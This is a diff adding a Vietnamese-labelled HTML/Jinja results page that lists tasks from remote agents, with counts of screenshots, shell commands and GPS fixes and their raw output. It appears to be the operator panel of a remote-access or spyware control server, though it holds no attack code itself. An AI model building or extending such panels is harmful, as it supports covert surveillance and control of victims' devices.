@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta http-equiv="refresh" content="15">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tra cứu bản ghi</title>
+<link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+<style>
+  .tabs { display: flex; flex-wrap: wrap; gap: 8px; margin: 4px 0 18px; }
+  .tab {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 6px 14px; border-radius: 8px; font-size: 12.5px;
+    background: var(--panel); border: 1px solid var(--border-soft);
+    color: var(--muted); text-decoration: none;
+    transition: all .15s;
+  }
+  .tab:hover { border-color: var(--accent); color: var(--text); }
+  .tab.active {
+    color: #fff; background: linear-gradient(135deg, rgba(78,161,255,.25), rgba(124,92,255,.25));
+    border-color: rgba(78,161,255,.5);
+  }
+  .tab .n {
+    font-family: "JetBrains Mono", Consolas, monospace; font-size: 10.5px;
+    background: rgba(0,0,0,.35); border-radius: 10px; padding: 1px 7px;
+  }
+  .rowmeta { display:flex; align-items:center; gap:10px; padding: 9px 18px; border-bottom: 1px solid var(--border-soft); }
+  .rowmeta:hover { background: rgba(78,161,255,.045); }
+  .reswrap { border-bottom: 1px solid var(--border); }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">🗂️</div>
+  <h1>⚙️ PORTAL DỮ LIỆU — TRA CỨU BẢN GHI</h1>
+  <div class="spacer"></div>
+  <span class="live"><i></i> auto-refresh 15s</span>
+</header>
+
+<main>
+
+  <div class="stats">
+    <div class="stat"><div class="n">{{ n_total }}</div><div class="l">Results Total</div></div>
+    <div class="stat g"><div class="n">{{ counts.get('screenshot', 0) }}</div><div class="l">📸 screenshots</div></div>
+    <div class="stat"><div class="n">{{ counts.get('shell', 0) }}</div><div class="l">💻 shell</div></div>
+    <div class="stat a"><div class="n">{{ counts.get('get_gps', 0) }}</div><div class="l">📍 GPS fixes</div></div>
+  </div>
+
+  <div class="tabs">
+    <a class="tab {{ 'active' if current == 'all' }}" href="/results">🌐 ALL <span class="n">{{ n_total }}</span></a>
+    {% for t, icon, label in task_types %}
+    <a class="tab {{ 'active' if current == t }}" href="/results?type={{ t }}">
+      {{ icon }} {{ label }} <span class="n">{{ counts.get(t, 0) }}</span>
+    </a>
+    {% endfor %}
+  </div>
+
+  <div class="panel">
+    <div class="ph">
+      <h2>{% if current == 'all' %}🌐 ALL results{% else %}{% for t, icon, label in task_types if t == current %}{{ icon }} {{ label }}{% endfor %} — {{ current }}{% endif %}</h2>
+      <span class="cnt">{{ tasks|length }} / {{ n_total }} shown (max 100 mới nhất)</span>
+      <div class="spacer"></div>
+    </div>
+    <div class="pb">
+      {% for t in tasks %}
+      <div class="reswrap">
+        <details class="res" {% if t.result and t.result|length < 120 %}open{% endif %}>
+          <summary>
+            <span class="tid">{{ t.task_id }}</span>
+            <span class="who">{{ t.agent_id }}</span>
+            <div class="spacer"></div>
+            <span class="who mono">{{ (t.created_at or '—')[:19].replace('T',' ') }}</span>
+            <span class="badge st-{{ t.status }}">{{ t.status }}</span>
+          </summary>
+          {% if t.result %}
+          <pre>{{ t.result[:2000] }}</pre>
+          {% elif t.error %}
+          <pre style="color:var(--red)">ERROR: {{ t.error }}</pre>
+          {% else %}
+          <pre style="color:var(--muted)">(không có payload — xem artifact tương ứng nếu là task upload)</pre>
+          {% endif %}
+        </details>
+      </div>
+      {% else %}
+      <table><tbody><tr><td class="empty">
+        Chưa có bản ghi cho loại này.
+      </td></tr></tbody></table>
+      {% endfor %}
+    </div>
+  </div>
+
+
+</main>
+  <footer>
+    © 2026 · <a href="/">← về trang chủ</a>
+  </footer>
+</body>
+</html>
